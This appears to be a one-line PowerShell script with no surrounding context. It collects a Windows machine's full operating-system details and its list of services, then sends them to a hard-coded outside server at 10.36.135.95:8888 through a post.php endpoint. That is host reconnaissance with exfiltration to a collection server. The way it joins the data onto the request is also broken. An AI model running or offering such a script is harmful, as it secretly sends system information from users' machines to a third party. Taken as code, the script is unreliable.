$infos = Get-CimInstance Win32_OperatingSystem | FL *;$task = Get-Service;$uri = 'http://10.36.135.95:8888/post.php?prenom=prout';$LoginResponse=Invoke-WebRequest $uri + $infos + $task -SessionVariable 'Session' -Method 'GET'